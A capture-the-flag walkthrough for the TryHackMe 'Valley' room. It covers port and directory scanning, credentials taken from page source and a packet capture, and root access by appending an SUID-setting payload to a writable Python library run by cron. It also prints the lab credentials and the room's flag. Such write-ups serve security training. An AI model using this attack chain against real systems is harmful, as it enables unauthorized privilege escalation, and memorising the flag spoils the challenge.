# TryHackMe - Valley Writeup

> **Link:** https://tryhackme.com/room/valleype

---

# Objective

Enumerate the target machine, discover exposed services, obtain initial access, and perform privilege escalation to root.

---

# Enumeration

## 1. Port Scanning

Perform a full TCP port scan to identify exposed services.

```bash
nmap -sS -p- -T5 <TARGET_IP>
```

### Results

```text
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
37370/tcp open  ftp
```

### Interesting Findings

* HTTP service running on port **80**
* SSH available on **22**
* FTP running on a **non-standard port (37370)**

---

# Web Enumeration

## 2. Directory Bruteforcing

Enumerate directories using FFUF.

```bash
ffuf -u http://<TARGET_IP>/FUZZ \
-w /opt/recon/wordlists/SecLists-master/Discovery/Web-Content/common.txt
```

### Discovered Directories

```
/gallery
/pricing
/static
```

The **/static** directory looked the most interesting and deserved further investigation.

---

## 3. Enumerating `/static`

Run another FFUF scan against the discovered directory.

```bash
ffuf -u http://<TARGET_IP>/static/FUZZ \
-w /opt/recon/wordlists/SecLists-master/Discovery/Web-Content/common.txt
```

### Interesting Result

```
/static/00
```

Visiting:

```
http://<TARGET_IP>/static/00
```

revealed the following message:

```
-remove /dev1243224123123
```

This hinted at a hidden development directory.

---

# Hidden Development Portal

Browsing to:

```
http://<TARGET_IP>/dev1243224123123/
```

Inspecting the page source revealed **hardcoded credentials**:

```javascript
username === "siemDev"
password === "california"
```

Login using:

```
Username: siemDev
Password: california
```

---

## Developer Notes

After authentication, the portal displayed several internal notes:

* Stop reusing credentials
* Check for vulnerabilities
* Keep systems patched
* Change FTP back to the default port

These notes strongly suggested that the FTP server contained useful information.

---

# FTP Enumeration

Connect to the FTP service.

```bash
ftp <TARGET_IP> 37370
```

Browse the available files.

One file stood out:

```
siemHTTP2.pcapng
```

Open the capture in **Wireshark**.

Searching through HTTP packets revealed credentials:

```
uname=valleyDev
psw=ph0t0s1234
remember=on
```

---

# Initial Access

Login through SSH using the recovered credentials.

```bash
ssh valleyDev@<TARGET_IP>
```

---

# Privilege Escalation Enumeration

As always, begin with:

```bash
sudo -l
```

No useful sudo privileges were available.

Next, inspect cron jobs.

```bash
cat /etc/crontab
```

Found the following scheduled task:

```text
1 * * * * root python3 /photos/script/photosEncrypt.py
```

A Python script was executed every minute as **root**.

---

# Reviewing the Cron Script

The script imported the Python **base64** module.

```python
#!/usr/bin/python3

import base64

for i in range(1,7):
    image_path="/photos/p"+str(i)+".jpg"

    with open(image_path,"rb") as image_file:
        image_data=image_file.read()

    encoded_image_data=base64.b64encode(image_data)

    output_path="/photos/photoVault/p"+str(i)+".enc"

    with open(output_path,"wb") as output_file:
        output_file.write(encoded_image_data)
```

The important observation was the imported module:

```python
import base64
```

---

# Python Library Hijacking

Locate the imported module.

```bash
locate base64.py
```

Permissions revealed something unusual:

```bash
ls -al /usr/lib/python3.8/base64.py
```

Output:

```text
-rwxrwxr-x 1 root valleyAdmin 20382 Mar 13 2023 /usr/lib/python3.8/base64.py
```

The module was writable.

Since the cron job executed as **root**, modifying the imported library would result in **arbitrary code execution as root**.

Append the following payload:

```bash
echo "import os; os.system('chmod u+s /bin/bash')" >> /usr/lib/python3.8/base64.py
```

Wait for the cron job to execute (approximately one minute).

---

# Root Shell

After the cron job runs, execute:

```bash
bash -p
```

A privileged shell is obtained.

Verify:

```bash
id
```

---

# Root Flag

```bash
cat /root/root.txt
```

```
THM{v@lley_0f_th3_sh@d0w_0f_pr1v3sc}
```

---


---

# Key Takeaways

* Always perform full port scans.
* Directory brute-forcing often reveals hidden application paths.
* Never trust client-side authentication; inspect JavaScript source.
* Developer notes can expose valuable operational information.
* PCAP files frequently contain sensitive credentials.
* Enumerate cron jobs after obtaining shell access.
* Check the permissions of imported Python modules.
* Writable Python libraries executed by privileged processes can lead to privilege escalation through **Python Library Hijacking**.

---

# Tools Used

* Nmap
* FFUF
* FTP
* Wireshark
* SSH
* Bash
* Python
  
---
